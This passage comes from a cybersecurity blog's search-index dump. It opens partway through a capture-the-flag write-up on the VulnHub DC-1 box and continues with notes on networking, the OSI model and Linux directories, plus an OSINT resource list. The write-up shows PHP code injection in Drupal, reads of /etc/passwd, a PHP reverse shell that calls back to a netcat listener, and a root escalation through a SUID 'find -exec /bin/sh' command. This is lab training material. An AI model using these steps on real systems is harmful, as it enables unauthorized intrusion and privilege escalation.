PHP code text format\u0026rdquo;\nDC-1 Drupal 7 PHP code permissions DC-1 Drupal 7 admin perms for php code I\u0026rsquo;m hoping by checking the admin box, this will allow any code inputted to be executed with admin privs. Exploiting PHP module Now that it\u0026rsquo;s enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file\u0026hellip;, if we have root privs.. doubtful. Content \u0026gt; Add Content \u0026gt; Basic Page Title = Whatever you want Body is where we\u0026rsquo;ll test the injection\u0026hellip; \u0026lt;?php system(\u0026quot;whoami\u0026quot;); ?\u0026gt; Change \u0026ldquo;Text Format\u0026rdquo; to the PHP code module, which is what we enabled with admin privs Then press preview\u0026hellip; let\u0026rsquo;s see if we can grab the current user\u0026hellip;\nWe got a response! \u0026ldquo;www-data\u0026rdquo;. Injection is working!\nDC-1 Drupal 7 PHP code injection! Let\u0026rsquo;s change the command from whoami to cat /etc/passwd. Looks like another two users to notate. www-data and flag4\nDC-1 Drupal 7 PHP code injection - passwd file Trying sudo cat /etc/shadow fails, so we don\u0026rsquo;t have sudo or root privs. Sudo may not even be installed\nPHP revshell Now it\u0026rsquo;s time to get ourselves a revshell through php injection\u0026hellip; let\u0026rsquo;s insert the following php code from this raw github file\u0026hellip; PentestMonkey\u0026rsquo;s PHP revshell\nYou\u0026rsquo;ll want to modify the following lines of code to match up with your nc -nvlp 1234 command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. You can change the ports to whatever you\u0026rsquo;d like.\n$ip = \u0026lsquo;192.168.56.1\u0026rsquo;; // CHANGE THIS $port = 1234; // CHANGE THIS Now open up another terminal with the nc -nvlp 1234, I mentioned before.\nYou should now have both: terminal with nc -nvlp 1234 running. Drupal Basic Page filled in with PentestMonkey\u0026rsquo;s reverse php shell Let\u0026rsquo;s hit preview and we should get a revshell as www-data. If we do, we\u0026rsquo;ll move onto privilege escalation.\nThe Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you\u0026rsquo;ll lose your revshell. We now have a revshell into the box but lacks tty! We\u0026rsquo;ll fix this in the next section. Let\u0026rsquo;s do a quick test by typing whoami into our new revshell. You should see \u0026ldquo;www-data\u0026rdquo;.\nDC-1 Drupal 7 - revshell w/o tty Privilege Escalation At this point, we now have a revshell into DC-1 whom does not have root privs. We\u0026rsquo;ll need to find a way to escalate the privs, so we can \u0026lsquo;own\u0026rsquo; the box!\nCustom tty First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C.\npython -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll='ls -lsaht --color=auto' Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 Now that you have a tty shell, with alias ll, and you can\u0026rsquo;t CTRL+C out of it on accident.. Let\u0026rsquo;s get to privesc(privilege escalation) but before that let\u0026rsquo;s update our \u0026rsquo;notes\u0026rsquo;\nBox Name: DC-1\nIP: 192.168.56.110\nOS: Debian(Linux)\nPorts \u0026amp; Service:\n80 - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version?\nDrupal -\u0026gt; Admin acct created owned:owned with Drupal 7.x SQLi exploit -\u0026gt; enabled php-code and created basic content to inject php-revshell giving us low-level shell. -\u0026gt; shifted into a tty that doesn\u0026rsquo;t allow CTRL+C disconnects -\u0026gt; now time to dig into privesc\n111 - rpcbind\n43450 - rpcbind related\n22 - ssh - least attractive since we have no usernames, passwords, or keys\nFound Users: Fred ; admin ; www-data ; flag4\nAt this point, we want to look through the box and find/document anything we can find. For time sake, we\u0026rsquo;ll skip most of this.\nWe could transfer linpeas.sh to enumerate the system for us, but let\u0026rsquo;s try without it.\nI like to look for binaries that have SUID or GUID perms. These SUIDs and GUIDs are binaries that have a perm set to s in the user or group column. What makes these binaries so attractive is that they are executed with the owner\u0026rsquo;s privs(think root 😃) but are accessible and executable by lower priv users/groups. Once we produce a list of SUID/GUID binaries, we can check them against GTFObins. SUID Search Let\u0026rsquo;s look for SUID binaries!\nfind / -perm -u=s -type f 2\u0026gt;/dev/null\nDC-1 Drupal 7 - SUID search Here\u0026rsquo;s the find binary. Look at the perms. You\u0026rsquo;re looking for an s in place of the executable bit set for user group.\nDC-1 Drupal 7 - SUID example Searching GTFObins Let\u0026rsquo;s look on GTFObins to see if any of these binaries have a SUID exploit that obtains and holds elevated privs.\n- /bin/mount - only has Sudo which isn\u0026rsquo;t installed on the box. So, pass.\n- /bin/ping - no SUID abuse\n- /bin/su - no SUID abuse\n- /bin/ping6 - isn\u0026rsquo;t listed\n- /bin/umount - isn\u0026rsquo;t listed\n- /usr/bin/at - no SUID abuse\n- /usr/bin/chsh - isn\u0026rsquo;t listed\n- /usr/bin/passwd - isn\u0026rsquo;t listed\n- /usr/bin/newgrp - isn\u0026rsquo;t listed\n- /usr/bin/chfn - isn\u0026rsquo;t listed\n- /usr/bin/gpasswd - isn\u0026rsquo;t listed\n- /usr/bin/procmail - isn\u0026rsquo;t listed\n- /usr/bin/find - WE HAVE A HIT! SUID bit can be abused!\n- command will be /usr/bin/find -exec /bin/sh \\; -quit\nAbusing the SUID Copy/paste /usr/bin/find -exec /bin/sh \\; -quit in the tty remote shell you have running in your terminal and let\u0026rsquo;s see if we can abuse the SUID bit to escalate privs to root\u0026hellip; $$$ - We have root! ROOTED! DC-1 Drupal 7 - ROOTED!!! ","description":"","id":2,"section":"hacking","tags":["DC-1 (vulnhub)"],"title":"DC-1 of DC Series(vulnhub)","uri":"https://MRCyberBlog.github.io/blog/hacking/ctfs/vulnhub/dc-series/dc-1/"},{"content":"Basic Networking A network is two or more hosts connected together in order to exchange data. There\u0026rsquo;s two network types: WAN (Wide Area Network) - network that connects large geographical areas. LAN (Local Area Network) - network that is confined within a WAN network. These networks use the 7 layers above to exchange data. IP addresses - Part 1/2 of TCP/IP network config (Layer 3) IP Addressing provides two functions:\nIdentifies a device\u0026rsquo;s network interface on the network. Gives the network device a network location to enable communications. An IP address is a binary number which is normally shown as a 32-bit decimal number divided, by decimals, into four separate 8-bit sections(octets).\nThis number represents two logical sections that determine the network ID and host ID.(more in subnet sections)\nNetwork ID provides the subnet a unique number and specifies the network class(A, B, or C). Host ID gets assigned to the network device and uniquely identifies the host. Example: 192.168.1.1 /24(255.255.255.0) Network ID = 192.168.1 \u0026lt;\u0026ndash; The first three octets specify the subnet\u0026rsquo;s network ID and doesn\u0026rsquo;t change. This tells the router which subnet to route the packet to. Host ID = 0.0.0.1 \u0026lt;\u0026ndash; The last octet is used for assigning IP addresses to host network devices. This tells the router which host, inside the network ID subnet, to route the packet to. IP addresses are assigned in two different ways:\nDynamic - The DHCP(Dynamic Host Configuration Protocol) server will assign an IP address to a network device based on the MAC address of the network interface. Static - DHCP server isn\u0026rsquo;t involved meaning the device network interface must assign its own IP address, MAC address, and Gateway address to a fixed value. Subnets As a network grows, it can start to become unmanageable resulting it unwanted effects like the lack of IP addresses and poor security, organization, and performance. A solution to this is to split up the larger network into smaller networks aka subnetting.\nA subnet, or subnetwork, is simply a network sitting inside another network defined by a different IP address(network ID).\nWhen you increase the number of subnets you decrease the number of hosts per subnet.\nSeparating the network improves: Security - by isolation. Performance - by reducing the amount of broadcasts and avoiding routers. Administration - by separating critical network devices and creating redundancies. Traffic going from one subnet to another subnet needs routed(router / gateway). Subnet masks - Part 2/2 of TCP/IP network config (Layer 3) Subnet masks are used, in TCP/IP, to specify if the network interface is within the same local subnet or within another subnet.\nSubnet masks are also 32-bit numbers and tell us which part of the IP address represents the Network ID and which part represents the Host ID range.\nWhen looking at a binary subnet mask, the binary 1\u0026rsquo;s represent Network ID and the binary 0\u0026rsquo;s represent Host ID range.\n/24 = 255.255.255.0 = CIDR tells you, from left to right, how many 1\u0026rsquo;s the subnet mask has enabled 255.255.255.0(is a decimal representation of the following binary number = 11111111.11111111.11111111.00000000) 11111111.11111111.11111111.00000000 = this is /24 in binary. From left to right, you\u0026rsquo;ll see that 24 1\u0026rsquo;s are enabled. In each octet section, you can have a maximum of 256 addresses. From left to right, each binary represents this number = 128 - 64 - 32 - 16 - 8 - 4 - 2 - 1 . Add those up and you\u0026rsquo;ll get 256. This explanation of CIDR to decimal to binary also applies to IP addresses. EXAMPLE TIME\nSimple break down of a IP Address\nLine up the binaries for the IP address and subnet mask\nIP Address = 192.168.123.132, Subnet = /24(CIDR) aka 255.255.255.0\n11000000.10101000.01111011.10000100 = Binary representation of IP address 192.168.123.132 11111111.11111111.11111111.00000000 = Binary representation of subnet 255.255.255.0. 1\u0026rsquo;s equal Network ID \u0026amp; 0\u0026rsquo;s equal Host ID range. Look at the first octet section of the subnet mask(starting from the left side). Where we see a 1, we need to carry over the IP address\u0026rsquo;s matching binary value to start building the Network ID. So overall, we need to carry over each binary value of the first three octets of the IP address to the Network ID since the subnet mask binaries are all 1\u0026rsquo;s in those first three octets. When we get to the binary 0\u0026rsquo;s, of the subnet mask, we then copy the matching IP address binary value over to the Host ID. We get the following: 11000000.10101000.01111011.00000000 - 192.168.123 Network ID 00000000.00000000.00000000.10000100 - 0.0.0.132 Host ID Finding the Host ID range, Network ID, and Broadcast IP from only knowing one IP address and it\u0026rsquo;s subnet mask\nLet\u0026rsquo;s drag down the same IP address from above but change the subnet mask, then work off that. 11111111.11111111.11111111.11|000000 = Subnet mask = /26 = 255.255.255.192\n11000000.10101000.01111011.10|000100 = IP Address within the subnet = 192.168.123.132\nAgain, the subnet mask tells us which bits, in the IP address, are used for the network ID and which are used for the host ID range. Any enabled bit on the left side of the | is for the network ID. This | sits just to the right of the last enabled bit within the subnet mask. Network ID binaries do not change. Any disabled bit on the right side of the | is for the host IP range. 11000000.10101000.01111011.10|000000 = network ID in bold = 192.168.123.128\n11000000.10101000.01111011.10|000000 through 11000000.10101000.01111011.10|111111 = host ID range in bold = 192.168.123.128 through 192.168.123.191\nOut of the host ID range we get three values: Network ID(lowest number of the Host IP range) = 192.168.123.128 Usable Host range = 192.168.123.129 through 192.168.123.190 This gives us 62 IP addresses to assign to hosts within the 192.168.123 subnet. Broadcast ID(highest number of the Host IP range) = 192.168.123.191 TCP vs UDP (Layer 4) TCP = Transmission Control Protocol\nSecure Connection oriented - 3-way handshake SYN \u0026gt; SYN ACK \u0026gt; ACK. Considered reliable since it only sends data once a connection is established. Data is sent in order and resent if errors occur. Dynamically manages congestion Much slower than UDP(higher latency and slower throughput). Uses more resources since more calculations are made. Data taken apart \u0026gt; sent \u0026gt; reconstructed. UDP = User Datagram Protocol\nUnsecure Connectionless oriented - No handshake Faster than TCP(Low latency with loss-tolerance and faster throughput) Used by real-time apps(video, audio, etc) Error packets are discarded Common Ports and Protocols TCP\nFTP (21) SSH (22) Telnet (23) SMTP (25) DNS (53) HTTP (80, 8080) Kerberos (88) POP3 (110) RpcBind (111) NNTP (119) NTP (123) RPC (135) SMB (139 + 455) IMAP (143) IRC (194) HTTPS (443, 8443) UDP\nDNS (53) DHCP (67,68) TFTP (69) SNMP (161) DNS (Layer 7) Domain Name System DNS\u0026rsquo;s main task is to associate domain names with their decimal IP addresses. Domain Names help identify services that reside on the internet, like websites. The most common way people interact with DNS is through their browser. Let\u0026rsquo;s start by opening a terminal window and run the following: nslookup google.com If you look down in the \u0026ldquo;Non-authoritative answer:\u0026rdquo; section, you\u0026rsquo;ll see the \u0026ldquo;Name: google.com\u0026rdquo; along with the IP address given to us by a DNS server. In my case, it\u0026rsquo;s \u0026ldquo;Address: 142.250.191.142\u0026rdquo; Without DNS, when you type google.com, into a browser, IP protocols wouldn\u0026rsquo;t know what to do with that as it\u0026rsquo;s not a decimal IP address. So to make our lives easier, a DNS server resolves an IP address to connect to and the browser just presents it as \u0026ldquo;google.com\u0026rdquo;. If you take the google.com associated IP address, in your nslookup command output, and enter that into a browser\u0026rsquo;s address bar, it\u0026rsquo;ll go to google.com without an issue. If you ever find yourself having issues resolving a website but you can ping another system\u0026hellip; broken DNS may be the cause. DNS is a meme these days since you\u0026rsquo;ll hear people joke about \u0026ldquo;Did you check DNS\u0026rdquo; as it\u0026rsquo;s a common issue in IT.\n","description":"","id":3,"section":"random","tags":["concepts"],"title":"entry to networking","uri":"https://MRCyberBlog.github.io/blog/random/networking/networking-concepts/networking/"},{"content":"OSI Layers(Open Systems Interconnection) and associated Protocol Data Unit(PDU) OSI Model is a 7 abstract layer table that\u0026rsquo;s responsible for explaining the flow of data within a network. Experienced individuals will often call out an issue by the culprit layer number. example: \u0026ldquo;This is a level 3 issue.\u0026rdquo; Protocol data unit(PDU) is a name given to the data when passing through each OSI layer. Bits, Frames, etc Physical - Layer 1 - Bits (PDU) Bit-by-bit delivery, modulation, start-stop signals, physical network.\nAnything to do with physical transmission of data.\nFrom transmission mode(full, half duplex) to pinout of a ethernet connector. Some related devices:\nEthernet hub, repeater, and physical transmission medium(wire, plug, outlet). Data link - Layer 2 - Frames (PDU) Encapsulation, frame sync, LLC, MAC\nProvides a link between two devices, via a physical layer, and provides flow control.\nIt also detects and corrects errors on layer 1.\nDefines two sublayers:\nMedia Access Control(MAC) - controls device access and grants permissions for data transit. Logical link control(LLC) - flow control, handles network layer protocols and error checking/frame sync. Some related devices:\nSwitch, bridge, NIC Network - Layer 3 - Packets (PDU) Controls addressing, routing, and traffic control.\nThis layer routes packets between two network nodes by providing cross-network addressing, routing and updates both routing tables \u0026amp; fragmented packets.\nTransport - Layer 4 - Segments \u0026amp; Datagrams (PDU) Reliability, flow control, connection-oriented communications, and multiplexing.\nLayer 4 is responsible for segmenting data and relieving congestion by determining the protocol to be used(TCP and UDP, or others), size of window(packet size(MTU)), and order of transmission.\nSession - Layer 5 - Data (PDU) Session management(build and control sessions) between two hosts.\nAuthentication, Authorization, Session restoration.\nThis layer opens, manages, and closes sessions between end-user application processes.\nAPI, sockets, WinSock\nPresentation - Layer 6 - Data (PDU) Translation \u0026gt; data de/compression \u0026gt; data de/encryption.\nThis layer converts data(MOV, JPEG, ASCII, etc), to and from the form that the application layer accepts, so it can be sent over the network.\nApplication - Layer 7 - Data (PDU) Communication protocol and interface methods, used by host processes, to enable network communications. In other words, applications handling data through specific protocols which then is sent through layer 6. This would include HTTP(S), IMAP, POP3, SMTP, FTP, SSH, etc Also provides service advertisement on the network. ","description":"","id":4,"section":"random","tags":["concepts"],"title":"osi model","uri":"https://MRCyberBlog.github.io/blog/random/networking/networking-concepts/osi-model/"},{"content":" Linux uses a tree oriented hierarchy, meaning it starts at one point and branches outward. This starting point is the / (system root) directory.\nThis particular hierarchy layout is based on the FHS (Filesystem Hierarchy Standard).\nFHS - (Filesystem Hierarchy Standard) Maintained by the Linux Foundation and last updated on June 3rd, 2015.(as of 12-16-22) FHS provides UNIX-like operating systems with a set of file and directory requirements and guidelines. Common directories that sit under / (system root). /bin - Essential command binaries used by the user and system /boot - Stores data required for system boot /dev - Files that represent devices attached to the system /etc - Static configuration files(not binaries) for the system /home - Location for individual files of particular user /lib - Essential shared libraries and kernel modules(drivers) /media - Mount point for removable media /mnt - Mount point for mounting a filesystem temporarily /opt - Add-on application software packages /root - Home directory for the root user /run - Data relevant to running processes since boot /sbin - Essential system binaries /srv - Data for services provided by this system /tmp - Temporary files(reboot usually clears this directory) /usr - Second major hierarchy(binaries and data) /bin - Most executable commands /include - Header files for compiling programs written in C /lib - More libraries and data files /local - User installed software /sbin - Non-Essential binaries for sysadmin /share - Hierarchy for read-only architecture independent data files /var - Hierarchy for variable data to sit in(logs, cache, software states) /cache - Cache data from applications /lib - Variable state information for applications and system /local - Variable data for /usr/local /lock - Lock files /log - Log files and directories /opt - Variable data for /opt /run - Runtime variables /spool - Application spool (queued) data /tmp - Temporary files preserved between system reboots ","description":"","id":5,"section":"random","tags":["linux filesystem hierarchy"],"title":"linux filesystem hierarchy","uri":"https://MRCyberBlog.github.io/blog/random/linux/linux-filesystem-hierarchy/"},{"content":" Let me explain my notes: The brackets() after each tool will indicate if the tool is: (built-in) = available in Kali\u0026rsquo;s repo. Simple sudo apt install *tool* (external *) = outside Kali\u0026rsquo;s repo. It\u0026rsquo;ll need downloaded then installed. (browser extension) = specified browser extension I\u0026rsquo;ll also try specifying any restrictions I know of. API access needed Paywalls etc etc etc OSINT AIO OSINT awesome osint (external website)\nAwesome OSINT is a large collection of resources dedicated to anything OSINT. GHunt (external app \u0026amp; website)\nCLI script, and online now, which can help you dig into Google accounts. haveibeenpwned (external website \u0026amp; API)\nAPI available by subscription\nThe website allows you to search through a large updated database of data dumps for either emails or passwords. It\u0026rsquo;s active and updated regularly. API subscription available. You send API the first 5 characters of a hash and API responses with a list of hashes matching the sent prefix. Hunchly (chrome extension)\nTrial available\nChrome extension for organizing your findings and exporting them. It also auto screenshots as you go. _IntelligenceX (external website)\nFree account creation required\nTools which can be used for many different purposes. Validating email format, DNS records, etc Maltego CE (built-in)\nAPIs aren\u0026rsquo;t needed but can help widen your net\nGreat link analysis tool for the aggregated data it collects. Helps visualize paths, etc. Give this tool a shot! OSINTCURIO.US (external)\nGreat project with a community of outstanding people. OSINT Framework (external)\nFun interactive site that can help you see the paths of OSINT but, honestly, I\u0026rsquo;ve never use it. recon-ng (built-in)\nGreat framework for OSINT gathering. It has a similar feeling to metasploit since it uses modules, \u0026ldquo;run\u0026rdquo;, etc Search Engines Google dorking(hacking) - https://google.com https://www.exploit-db.com/google-hacking-database https://www.google-dorking.com/ https://www.dorksearch.com/ https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf Google Earth - https://earth.google.com/web/ WolframAlpha - https://www.wolframalpha.com/ Bing - https://bing.com https://support.microsoft.com/en-us/topic/advanced-search-keywords-ea595928-5d63-4a0b-9c6b-0b769865e78a Yahoo - https://search.yahoo.com/ https://en.wikibooks.org/wiki/How_To_Search/Yahoo Device Search Engines Shodan - https://www.shodan.io/ - Internet connected device search engine. https://skerritt.blog/shodan/ Censys - https://censys.io/ - Internet connected device serach engine. https://support.censys.io/hc/en-us Image Search Engines PimEyes - https://pimeyes.com/en - Ai driven reverse image search - Safe search will hinder results but be warned, removing safe search will cause NSFW results. Possible paywall. Look at source? TinEye - https://tineye.com/ - Reverse image search. Google Images - https://www.google.com/imghp?hl=EN - Google\u0026rsquo;s reverse image search. Social Networking Platforms LinkedIn - https://www.linkedin.com/ Twitter - https://twitter.com/explore Facebook - https://www.facebook.com/ - https://www.facebook.com/directory/pages - They removed /people 😭 Instagram - https://www.instagram.com/instagram/?hl=en Pinterest - https://www.pinterest.com/ideas/ Reddit - https://www.reddit.com/search Tumblr - https://www.tumblr.com/explore/trending Username search CheckUserNames - https://checkusernames.com/ Website Technology Stack Wappalyzer Browser Plugin - https://www.wappalyzer.com/ MetaData ExifTool - https://exiftool.org/ - Read, Write, and Edit Meta Information! Programs / Scripts Maltego CE - https://www.maltego.com/maltego-community/ - Very powerful intelligence search engine. Account required. Possible need for external API access\u0026hellip; Make sure you use anonymous accounts. Click \u0026lsquo;Maltego Desktop App Guide\u0026rsquo; - https://docs.maltego.com/support/home Youtube beginner playlist - https://www.youtube.com/watch?v=ceQhIBKFp2A\u0026amp;list=PLfRX-xJAc2yz6CjQVQuogJeCBoy8HbCOR theHarvester - https://github.com/laramies/theHarvester - \u0026ldquo;\u0026hellip;determine a domain\u0026rsquo;s external landscape\u0026rdquo; by name, email, subdomains, and URLs. Sherlock - https://github.com/sherlock-project/sherlock - Search all social platforms by username. Recon-Ng - https://github.com/lanmaster53/recon-ng - Gathering tool for OSINT - Passive and Active. Shodan.io - https://www.shodan.io/ - web \u0026amp; IoT search engine. Anything open to the internet. ./ Creepy - https://www.geocreepy.com/ - GeoLocation OSINT. Geo info from social platforms. Nmap - https://nmap.org/ - Great \u0026ldquo;auditing tool\u0026rdquo; \u0026amp; network exploration of local \u0026amp; remote hosts. RustScan - https://github.com/RustScan/RustScan - Very noisy but very quick port scanner. Great starter for CTFs. WebShag - https://github.com/wereallfeds/webshag - web server audit tool. crawls, scans, and fuzzes a webserver. hunter.io - https://hunter.io/ - Find emails associated with a domain. Enumeration DNS Enumeration dnsrecon - https://github.com/darkoperator/dnsrecon - DNS and Scanning Tool - DNS related info of target. LinkedIn Enumeration InSpy - https://github.com/leapsecurity/InSpy - requires hunter.io API key - https://hunter.io/ Windows/Samba Enumeration enum4linux-ng - https://github.com/cddmp/enum4linux-ng Cryptography https://github.com/sobolevn/awesome-cryptography\nData Breach search engines have i been pwned? - https://haveibeenpwned.com/ - free breach search by phone or email or domain Pastebin dump security monitor - https://psbdmp.ws/ Intelligence X - https://intelx.io/ CTFs TryHackMe - https://tryhackme.com/\nHackTheBox - https://www.hackthebox.com/\nHackTheBox - Academy https://academy.hackthebox.com/\nHacking HackTricks - https://book.hacktricks.xyz/\nPentest Everything - https://viperone.gitbook.io/pentest-everything\nCheat Sheets Wordlists Podcasts ","description":"","id":6,"section":"resources","tags":null,"title":"resources","uri":"https://MRCyberBlog.github.io/blog/resources/resources/"}]